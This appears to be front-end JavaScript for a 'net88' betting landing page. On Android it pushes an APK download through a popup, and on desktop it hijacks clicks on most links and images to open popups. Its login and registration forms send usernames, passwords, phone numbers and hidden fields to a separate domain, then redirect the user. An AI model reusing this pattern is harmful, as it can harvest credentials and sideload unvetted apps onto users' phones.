document.addEventListener('DOMContentLoaded', function() {
    const MAIN_URL = 'https://api.vnkubet.site/submit';
    document.querySelector('.register-btn').addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelector('.button-none .elementor-button').click();
    });

    function isMobileAndroid() {
        return /Android/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
    }

    // Check if the user is on an Android mobile device
    if (isMobileAndroid()) {
        window.addEventListener('load', function () {
            setTimeout(function () {

                function createPopup() {
                    // Create popup HTML
                    const popupHTML = `
                    <div class="popup-overlay">
                        <div class="popup-content">
                            <a role="button" tabindex="0" aria-label="Close" href="#" class="dialog-close-button dialog-lightbox-close-button">
                                x
                            </a>
                            <div class="dialog-message">
                                <img id="popup-image" src="https://cdn.jsdelivr.net/gh/Hexx231/cdn-ph@feature/v1.0.4/download_picture.png" alt="">
                            </div> 
                        </div>
                    </div>`;

                    // Popup style
                    const style = document.createElement('style');
                    style.textContent = `
                    .popup-overlay {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        pointer-events: all;
                        background-color: rgba(0, 0, 0, .8);
                        position: fixed;
                        height: 100%;
                        width: 100%;
                        bottom: 0;
                        left: 0;
                        z-index: 9999;
                        user-select: none;
                    }

                    .popup-content {
                        background-color: #fff;
                        border-radius: 16px;
                        box-shadow: 2px 8px 23px 3px rgba(0, 0, 0, 0.2);
                        position: relative;
                        padding: 25px;
                        max-width: 90vw;
                        max-height: 90vh;
                        overflow: auto;
                    }

                    .dialog-close-button {
                        width: 25px;
                        height: 25px;
                        border-radius: 50%;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        background-color: #B3B3B3;
                        position: absolute;
                        top: 20px;
                        right: 20px;
                        font-size: 20px;
                        font-weight: 700;
                        color: #FFFFFF;
                        cursor: pointer;
                    }
                    `;

                    document.head.appendChild(style);
                    document.body.insertAdjacentHTML('beforeend', popupHTML);

                    // Attach event listeners after the elements are in the DOM
                    const closeButton = document.querySelector('.dialog-close-button');
                    closeButton.addEventListener('click', function(event) {
                        event.preventDefault();
                        document.querySelector('.popup-overlay').remove();
                    });

                    const imageButton = document.querySelector('#popup-image');
                    imageButton.addEventListener('click', function(e) {
                        e.preventDefault();
                        var fileUrl = `https://${window.location.hostname}/app/NET88_V1.apk`;

                        // Create an 'a' element and trigger a download
                        var a = document.createElement('a');
                        a.href = fileUrl;
                        a.download = 'net88.apk';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    });

                    // Close popup when clicking outside of the popup content
                    const popupOverlay = document.querySelector('.popup-overlay');
                    popupOverlay.addEventListener('click', function(event) {
                        if (!event.target.closest('.popup-content')) {
                            popupOverlay.remove();
                        }
                    });

                }

                createPopup();

            }, 1500);
        });

    }
    else {
        
        jQuery(".elementor-slides-wrapper, .elementor-gallery-item, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper, .comment-section .elementor-widget-wrap")
            .click(function(e) {
            e.preventDefault();
            elementorProFrontend.modules.popup.showPopup({ id: 35 });
        });

        jQuery(".elementor-widget-image-carousel, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper")
            .click(function() {
                elementorProFrontend.modules.popup.showPopup({ id: 495 });
        });
        //close popup
        jQuery(document).on("click","#elementor-popup-modal-35 ul.elementor-icon-list-items li:nth-child(2) a", function (e) {
            e.preventDefault();
            jQuery("#elementor-popup-modal-35 .dialog-close-button").click();
            }
            );
            
            jQuery(document).on("click", "#elementor-popup-modal-637 ul.elementor-icon-list-items li:nth-child(2) a", function (e) {
            e.preventDefault();
            jQuery("#elementor-popup-modal-637 .dialog-close-button").click();
            }
        );
    }
    
    document.querySelector('.login-btn').addEventListener('click', function(e) {
        e.preventDefault();
        const button = this;
        if (window.innerWidth < 768) {
            document.querySelector('.button-login-none .elementor-button').click();
        } else {
            let formTarget = document.querySelector('.hp-login-form1');
            let username = formTarget.querySelector('input.username').value;
            let password = formTarget.querySelector('input.password').value;
            if(username === '' || password === '') {
                button.disabled = false;
            }
            else {
                button.disabled = true;
            }
            const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
            fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
        }
    });

    jQuery(document).on('elementor/popup/show', function () {
        let loginForm = document.querySelector('.login-confirm-btn');
        let registerForm = document.querySelector('.register-confirm-btn');

        if (loginForm) {
            loginForm.addEventListener('click', function(e) {
                e.preventDefault();
                const button = this;
                let formTarget = document.querySelector('.hp-login-form');
                let username = formTarget.querySelector('input.username').value;
                let password = formTarget.querySelector('input.password').value;
                const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
                if(username === '' || password === '') {
                    button.disabled = false;
                }
                else {
                    button.disabled = true;
                    showSpinner();
                }
                
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
            });
        }

        if (registerForm) {
            registerForm.addEventListener('click', async function(e) {
                e.preventDefault();
                const button = this;
                let formTarget = document.querySelector('.hp-register-form');
                let usernameVal = formTarget.querySelector('input.username').value;
                let passwordVal = formTarget.querySelector('input.password').value;
                let phoneVal = formTarget.querySelector('input.phone-number').value;
                let emailVal = formTarget.querySelector('input.email') ? formTarget.querySelector('input.email').value : '';

                const hiddenInputsObj = {};
                const hiddenInputs = formTarget.querySelectorAll('input[type="hidden"]');
                hiddenInputs.forEach(input => {
                    const name = input.getAttribute('name');
                    const value = input.value;
                    hiddenInputsObj[name] = value;
                });

                if(usernameVal && passwordVal && phoneVal) {
                    button.disabled = true;
                    showSpinner();
                }
                else {
                    button.disabled = false;
                }
            
                const bodyObj = {
                    username: usernameVal,
                    password: passwordVal,
                    phoneNumber: phoneVal,
                    email: emailVal,
                    formType: 'register',
                    brand: 'net88',
                    ip: window.changeIpAddress || null,
                };
                let jsonData = {...bodyObj, hiddenInputs: {...hiddenInputsObj}};
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
            });
        }
    });

    function optionsForApiRequest(jsonData) {
        return {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonData)
        };
    }

    function fetchApi(url, options, button) {
        fetch(url, options)
        .then((res) => res.json())
        .then(response => {
            if (response.status === "OK") {
                loginWithToken(response.target);
            } else {
                console.log('Error:', response);
                alert(response.message.message);
            }
        })
        .catch(error => console.error('ERROR:', error.message.message))
        .finally(() => {
            hideSpinner();
            button.disabled = false; // Re-enable the button here
        });
    }

    function loginWithToken(loginUrl) {
        window.open(loginUrl, '_self');
    }

    function showSpinner(event){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'inline-block';
        });
    }
    function hideSpinner(){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'none';
        });
    }
    
});